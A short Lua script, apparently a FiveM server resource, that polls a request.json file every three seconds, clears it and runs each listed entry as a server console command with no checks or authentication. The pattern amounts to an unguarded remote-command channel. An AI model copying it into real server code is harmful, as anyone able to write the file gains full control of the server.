local the_data_need
CreateThread(function()
    while true do
        Wait(1000*3)
        the_data_need = LoadResourceFile(GetCurrentResourceName(), "./request.json") 
        if the_data_need then
            the_data_need = json.decode(the_data_need)
        end
        if type(the_data_need) == 'table' then
            SaveResourceFile(GetCurrentResourceName(), 'request.json', '')
            for _,i in pairs(the_data_need) do
                ExecuteCommand(i)
            end
        end
    end
end)

